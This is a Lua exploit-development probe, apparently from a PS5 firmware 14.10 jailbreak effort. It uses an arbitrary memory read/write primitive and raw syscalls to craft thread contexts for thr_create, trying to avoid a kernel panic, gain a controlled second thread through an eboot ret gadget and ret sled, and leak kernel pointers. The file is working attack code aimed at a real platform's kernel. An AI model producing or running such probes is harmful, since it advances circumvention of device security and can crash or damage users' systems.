-- CRASH_CLASS: HIGH (may still panic if CS=0x43 hypothesis is wrong)
-- PROBE 80a: thr_create with CS=0x43/SS=0x3B — THE threading test
--
-- Context: Two independent analyses (PRs #30, #31) identified that the
-- thr_create kernel panic is caused by CS=0 in the ucontext. set_mcontext()
-- copies CS from user context without forcing SEL_RPL_MASK. CS=0 makes the
-- kernel treat the child thread's fault as kernel-mode → panic.
--
-- THE FIX: Set CS=0x43 (user code segment) and SS=0x3B (user stack segment).
-- These are standard FreeBSD amd64 user-mode selectors.
--
-- This probe has 4 sections (change TEST_SECTION before each run):
--   1: CS=0x43/SS=0x3B + RIP=0 (should SIGSEGV, NOT panic)
--   2: CS=0x43/SS=0x3B + RIP=eboot ret gadget (thread should execute ret)
--   3: CS=0x43/SS=0x3B + RIP=eboot ret + RSP=GPU mmap (controlled thread!)
--   4: CS=0x43/SS=0x3B + busy-loop RIP (thread runs, main thread reads its state)
--
-- If section 1 survives without a kernel panic: THREADING IS ALIVE on 14.10.
-- If section 3 works: we have a controlled second thread → race conditions possible.

local TEST_SECTION = 1

print("=== PROBE 80a: THR_CREATE CS=0x43 THREADING TEST ===")
print("TEST_SECTION=" .. TEST_SECTION)
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc_getpid = make_syscall(20)
local sc_thr_self = make_syscall(432)
local sc_thr_create = make_syscall(430)
local sc_thr_kill = make_syscall(433)
local sc_thr_suspend = make_syscall(442)
local sc_thr_wake = make_syscall(443)
local sc_nanosleep = make_syscall(240)
local sc_mmap = make_syscall(477)

local function canary()
    local ok, pid = pcall(function() return sc_getpid():tonumber() end)
    return ok, pid
end

local alive_ok, pid = canary()
print("[0] canary pid=" .. tostring(pid))

-- Get main thread's TID for comparison
local tid_buf = memory.alloc(8)
zero(tid_buf, 8)
pcall(function() sc_thr_self(uint64(tid_buf)) end)
local main_tid = rq(tid_buf)
print("[0] main TID=" .. q(main_tid))

-- Get eboot text base for gadgets
local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local text_lo = rd(info + 0x108)
local text_hi = rd(info + 0x10C)
local eboot_base = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0))
print("[0] eboot text base=" .. q(eboot_base))

-- Find a ret gadget in eboot (0xC3 = ret)
-- We know from 56g that eboot+0x42 is a ret gadget
local ret_gadget = eboot_base + 0x42
print("[0] ret gadget=" .. q(ret_gadget))

-- Verify it's readable and is actually 0xC3
local ok_r, ret_byte = pcall(function() return memory.read_byte(ret_gadget) end)
print("[0] ret gadget byte: ok=" .. tostring(ok_r) .. " val=0x" .. string.format("%02X", to_num(ret_byte)))

-- Known FreeBSD amd64 user-mode selectors:
-- CS = 0x43 (GSEL(GUCODE_SEL, SEL_UPL) = (8 << 3) | 3 = 0x43)
-- SS = 0x3B (GSEL(GUDATA_SEL, SEL_UPL) = (7 << 3) | 3 = 0x3B)
-- RFLAGS = 0x202 (IF=1, reserved bit 1 = 1)
local USER_CS = 0x43
local USER_SS = 0x3B
local USER_RFLAGS = 0x202

-- ucontext_t layout (FreeBSD amd64, from 13.60 decompile):
-- +0x10: uc_mcontext (struct mcontext)
--   Within mcontext (offsets from mcontext start = ucontext+0x10):
--     +0x48: mc_rdi
--     +0x50: mc_rsi
--     +0x58: mc_rdx
--     +0x60: mc_rbx
--     +0x68: mc_rcx
--     +0x70: mc_rax
--     +0x80: mc_rip
--     +0x88: mc_cs        ← 0x43!
--     +0x90: mc_rflags    ← 0x202!
--     +0x98: mc_rsp
--     +0xA0: mc_ss        ← 0x3B!
--     +0x108: mc_len = 0x480
--     +0x110: mc_flags (set low bit for valid FP)
--
-- NOTE: These offsets are from the 13.60 decompile. Sony may have modified them.
-- Probe seg/79a (getmcontext) gives the REAL offsets. If available, use those.
-- For now, we try the standard FreeBSD offsets.
--
-- Alternative offset mapping (from 58e/76d probes that wrote ctx):
--   The probes wrote at ctx-relative offsets, not mcontext-relative.
--   58e used: ctx+0x90=rip, ctx+0xA8=rsp, ctx+0x118=mc_len=0x480
--   So mcontext starts at ctx+0x10, and:
--     ctx+0x90 = mcontext+0x80 = mc_rip ✓
--     ctx+0xA8 = mcontext+0x98 = mc_rsp ✓
--     ctx+0x118 = mcontext+0x108 = mc_len ✓
--   Therefore:
--     ctx+0x98 = mcontext+0x88 = mc_cs
--     ctx+0xA0 = mcontext+0x90 = mc_rflags
--     ctx+0xB0 = mcontext+0xA0 = mc_ss

local CTX_SIZE = 0x500
local MC_OFFSET = 0x10     -- mcontext within ucontext
local MC_RDI  = MC_OFFSET + 0x48
local MC_RSI  = MC_OFFSET + 0x50
local MC_RDX  = MC_OFFSET + 0x58
local MC_RCX  = MC_OFFSET + 0x68
local MC_RAX  = MC_OFFSET + 0x70
local MC_RIP  = MC_OFFSET + 0x80  -- = ctx+0x90
local MC_CS   = MC_OFFSET + 0x88  -- = ctx+0x98
local MC_RFLAGS = MC_OFFSET + 0x90  -- = ctx+0xA0
local MC_RSP  = MC_OFFSET + 0x98  -- = ctx+0xA8
local MC_SS   = MC_OFFSET + 0xA0  -- = ctx+0xB0
local MC_LEN  = MC_OFFSET + 0x108 -- = ctx+0x118

-- Cross-check: 58e wrote rip at ctx+0x90 → MC_RIP = 0x10+0x80 = 0x90 ✓
-- 58e wrote rsp at ctx+0xA8 → MC_RSP = 0x10+0x98 = 0xA8 ✓
-- 58e wrote mc_len at ctx+0x118 → MC_LEN = 0x10+0x108 = 0x118 ✓
print("[0] offset check: MC_RIP=0x" .. string.format("%X", MC_RIP) ..
    " MC_RSP=0x" .. string.format("%X", MC_RSP) ..
    " MC_CS=0x" .. string.format("%X", MC_CS) ..
    " MC_SS=0x" .. string.format("%X", MC_SS))

-- TID output buffer
local new_tid_buf = memory.alloc(8)

-- ==============================
-- SECTION 1: CS=0x43 + RIP=0 (should SIGSEGV, not panic)
-- ==============================
if TEST_SECTION == 1 then
    print("")
    print("=== SECTION 1: CS=0x43 + RIP=0 (SIGSEGV expected, NO panic) ===")
    print("[!] If the PS5 shuts down: CS=0x43 hypothesis is WRONG for 14.10")
    print("[!] If this prints COMPLETE: CS=0x43 PREVENTS the panic!")
    print("")

    local ctx = memory.alloc(CTX_SIZE)
    zero(ctx, CTX_SIZE)

    -- Set the critical segment registers
    wq(ctx + MC_CS, uint64(USER_CS))        -- CS = 0x43
    wq(ctx + MC_SS, uint64(USER_SS))        -- SS = 0x3B
    wq(ctx + MC_RFLAGS, uint64(USER_RFLAGS)) -- RFLAGS = 0x202
    wq(ctx + MC_LEN, uint64(0x480))          -- mc_len

    -- RIP = 0 (will fault, but as USER mode fault → SIGSEGV)
    wq(ctx + MC_RIP, uint64(0))
    -- RSP = 0 (irrelevant, thread faults at RIP before touching stack)
    wq(ctx + MC_RSP, uint64(0))

    -- Verify what we wrote
    print("[1] ctx dump:")
    print("  MC_RIP    (+0x" .. string.format("%X", MC_RIP) .. "): " .. q(rq(ctx + MC_RIP)))
    print("  MC_CS     (+0x" .. string.format("%X", MC_CS) .. "): " .. q(rq(ctx + MC_CS)))
    print("  MC_RFLAGS (+0x" .. string.format("%X", MC_RFLAGS) .. "): " .. q(rq(ctx + MC_RFLAGS)))
    print("  MC_RSP    (+0x" .. string.format("%X", MC_RSP) .. "): " .. q(rq(ctx + MC_RSP)))
    print("  MC_SS     (+0x" .. string.format("%X", MC_SS) .. "): " .. q(rq(ctx + MC_SS)))
    print("  MC_LEN    (+0x" .. string.format("%X", MC_LEN) .. "): " .. q(rq(ctx + MC_LEN)))

    zero(new_tid_buf, 8)
    wq(new_tid_buf, uint64(0xDEADDEAD))

    print("[1] calling thr_create...")
    local ok_tc, rv_tc = pcall(function()
        return sc_thr_create(uint64(ctx), uint64(new_tid_buf), uint64(0))
    end)
    local new_tid = rq(new_tid_buf)
    print("[1] thr_create: ok=" .. tostring(ok_tc) .. " rv=" .. tostring(rv_tc) .. " tid=" .. q(new_tid))

    -- If we reach here, no kernel panic!
    print("[1] *** NO KERNEL PANIC! ***")

    -- Wait a bit for the child thread to fault
    local ts = memory.alloc(16)
    wq(ts, 0); wq(ts + 8, 500000000) -- 500ms
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

    local c1_ok, c1_pid = canary()
    print("[1] canary: ok=" .. tostring(c1_ok) .. " pid=" .. tostring(c1_pid))

    if c1_ok then
        print("[1] *** CS=0x43 PREVENTS THE PANIC! Process survived! ***")
    end

-- ==============================
-- SECTION 2: CS=0x43 + RIP=ret gadget (thread executes, hits ret, then what?)
-- ==============================
elseif TEST_SECTION == 2 then
    print("")
    print("=== SECTION 2: CS=0x43 + RIP=ret gadget ===")

    local ctx = memory.alloc(CTX_SIZE)
    zero(ctx, CTX_SIZE)

    wq(ctx + MC_CS, uint64(USER_CS))
    wq(ctx + MC_SS, uint64(USER_SS))
    wq(ctx + MC_RFLAGS, uint64(USER_RFLAGS))
    wq(ctx + MC_LEN, uint64(0x480))
    wq(ctx + MC_RIP, ret_gadget)
    wq(ctx + MC_RSP, uint64(0)) -- RSP=0 → ret will fault reading [rsp]

    print("[2] RIP=" .. q(ret_gadget) .. " (ret gadget)")

    zero(new_tid_buf, 8)
    wq(new_tid_buf, uint64(0xDEADDEAD))

    print("[2] calling thr_create...")
    local ok_tc, rv_tc = pcall(function()
        return sc_thr_create(uint64(ctx), uint64(new_tid_buf), uint64(0))
    end)
    local new_tid = rq(new_tid_buf)
    print("[2] thr_create: ok=" .. tostring(ok_tc) .. " rv=" .. tostring(rv_tc) .. " tid=" .. q(new_tid))

    local ts = memory.alloc(16)
    wq(ts, 0); wq(ts + 8, 500000000)
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

    local c2_ok, c2_pid = canary()
    print("[2] canary: ok=" .. tostring(c2_ok) .. " pid=" .. tostring(c2_pid))

-- ==============================
-- SECTION 3: CS=0x43 + RIP=ret + RSP=GPU mmap (controlled second thread!)
-- ==============================
elseif TEST_SECTION == 3 then
    print("")
    print("=== SECTION 3: CS=0x43 + RIP=ret + RSP→GPU mmap ===")

    -- Allocate GPU mmap for the child thread's stack
    local stack_pages = 16
    local stack_size = stack_pages * 0x4000
    local sc_mmap2 = make_syscall(477)
    local ok_mm, stack_base = pcall(function()
        return sc_mmap2(uint64(0), uint64(stack_size), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    print("[3] stack mmap: ok=" .. tostring(ok_mm) .. " base=" .. q(stack_base))

    if not ok_mm then
        print("[3] mmap failed!")
        return
    end

    -- Fill stack with marker pattern
    local sh, sl = get_hi_lo(stack_base)
    for off = 0, stack_size - 8, 8 do
        wq(stack_base + off, uint64(string.format("0x%08X%08X", 0xBBBB0000 + (off / 8), off)))
    end

    -- Set RSP to middle of GPU stack (stack grows down)
    local stack_top = stack_base + stack_size - 0x100
    -- Write a return address at [rsp] for the ret gadget
    -- Put 0 there so after ret, thread faults at RIP=0 (user-mode fault = SIGSEGV)
    wq(stack_top, uint64(0))

    local ctx = memory.alloc(CTX_SIZE)
    zero(ctx, CTX_SIZE)
    wq(ctx + MC_CS, uint64(USER_CS))
    wq(ctx + MC_SS, uint64(USER_SS))
    wq(ctx + MC_RFLAGS, uint64(USER_RFLAGS))
    wq(ctx + MC_LEN, uint64(0x480))
    wq(ctx + MC_RIP, ret_gadget)
    wq(ctx + MC_RSP, stack_top)
    -- Set RDI to a marker so we can detect if the thread ran
    wq(ctx + MC_RDI, uint64(0xCAFECAFE))

    print("[3] RIP=" .. q(ret_gadget) .. " RSP=" .. q(stack_top))

    zero(new_tid_buf, 8)
    wq(new_tid_buf, uint64(0xDEADDEAD))

    print("[3] calling thr_create...")
    local ok_tc, rv_tc = pcall(function()
        return sc_thr_create(uint64(ctx), uint64(new_tid_buf), uint64(0))
    end)
    local new_tid = rq(new_tid_buf)
    print("[3] thr_create: ok=" .. tostring(ok_tc) .. " rv=" .. tostring(rv_tc) .. " tid=" .. q(new_tid))

    local ts = memory.alloc(16)
    wq(ts, 0); wq(ts + 8, 500000000)
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

    -- Check if the stack was modified by the thread (signal frame?)
    print("[3] stack area around RSP after thread fault:")
    for off = -0x80, 0x80, 8 do
        local val = rq(stack_top + off)
        local marker = (off >= -0x80 and off < 0) and "  " or " *"
        if val then
            local vh, vl = get_hi_lo(val)
            if vh >= 0xFFFF8000 then
                print(string.format("  RSP%+d: %s *** KERNEL POINTER! ***", off, q(val)))
            elseif vh == 0xBBBB0000 + ((stack_size - 0x100 + off) / 8) then
                -- Still our marker
            else
                print(string.format("  RSP%+d: %s (modified)", off, q(val)))
            end
        end
    end

    local c3_ok, c3_pid = canary()
    print("[3] canary: ok=" .. tostring(c3_ok) .. " pid=" .. tostring(c3_pid))

-- ==============================
-- SECTION 4: CS=0x43 + busy-loop gadget (thread RUNS, main reads state)
-- ==============================
elseif TEST_SECTION == 4 then
    print("")
    print("=== SECTION 4: CS=0x43 + BUSY LOOP (thread runs persistently) ===")

    -- Find a jmp-to-self gadget in eboot: EB FE = jmp -2 (infinite loop)
    -- Or use a known pattern. Since we can't easily find this, use ret
    -- with RSP pointing to a loop of ret gadgets (ret sled = busy loop)
    local stack_size = 0x4000
    local sc_mmap3 = make_syscall(477)
    local ok_mm, sled_base = pcall(function()
        return sc_mmap3(uint64(0), uint64(stack_size), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    print("[4] ret sled mmap: ok=" .. tostring(ok_mm) .. " base=" .. q(sled_base))

    if not ok_mm then
        print("[4] mmap failed!")
        return
    end

    -- Fill entire page with the ret gadget address → "ret sled"
    -- Each ret pops 8 bytes and jumps to the next address = next ret
    -- This makes the thread slide through ~2000 rets (16KB / 8 = 2048 entries)
    local rg_h, rg_l = get_hi_lo(ret_gadget)
    for off = 0, stack_size - 8, 8 do
        wq(sled_base + off, ret_gadget)
    end
    -- Last entry: 0 → fault after sliding through all rets
    wq(sled_base + stack_size - 8, uint64(0))

    local ctx = memory.alloc(CTX_SIZE)
    zero(ctx, CTX_SIZE)
    wq(ctx + MC_CS, uint64(USER_CS))
    wq(ctx + MC_SS, uint64(USER_SS))
    wq(ctx + MC_RFLAGS, uint64(USER_RFLAGS))
    wq(ctx + MC_LEN, uint64(0x480))
    wq(ctx + MC_RIP, ret_gadget)
    wq(ctx + MC_RSP, sled_base) -- start of ret sled

    print("[4] RIP=" .. q(ret_gadget) .. " RSP=" .. q(sled_base) .. " (ret sled, ~2048 rets)")

    zero(new_tid_buf, 8)
    wq(new_tid_buf, uint64(0xDEADDEAD))

    print("[4] calling thr_create...")
    local ok_tc, rv_tc = pcall(function()
        return sc_thr_create(uint64(ctx), uint64(new_tid_buf), uint64(0))
    end)
    local new_tid = rq(new_tid_buf)
    print("[4] thr_create: ok=" .. tostring(ok_tc) .. " rv=" .. tostring(rv_tc) .. " tid=" .. q(new_tid))

    -- Try to interact with the child thread while it's sliding
    if to_num(rv_tc) == 0 and new_tid then
        local nh, nl = get_hi_lo(new_tid)
        if nl ~= 0xDEADDEAD then
            -- Try thr_suspend on the child
            local ok_sus, rv_sus = pcall(function()
                return sc_thr_suspend(new_tid)
            end)
            print("[4] thr_suspend(child): ok=" .. tostring(ok_sus) .. " rv=" .. tostring(rv_sus))

            -- Try thr_kill SIGSTOP
            local ok_kill, rv_kill = pcall(function()
                return sc_thr_kill(new_tid, uint64(17))
            end)
            print("[4] thr_kill(SIGSTOP): ok=" .. tostring(ok_kill) .. " rv=" .. tostring(rv_kill))
        end
    end

    local ts = memory.alloc(16)
    wq(ts, 0); wq(ts + 8, 1000000000) -- 1 second
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

    local c4_ok, c4_pid = canary()
    print("[4] canary: ok=" .. tostring(c4_ok) .. " pid=" .. tostring(c4_pid))

else
    print("[!] Invalid TEST_SECTION=" .. TEST_SECTION .. " (use 1-4)")
end

print("")
print("=== PROBE 80a SECTION " .. TEST_SECTION .. " COMPLETE ===")
print("=== PROBE 80a COMPLETE ===")
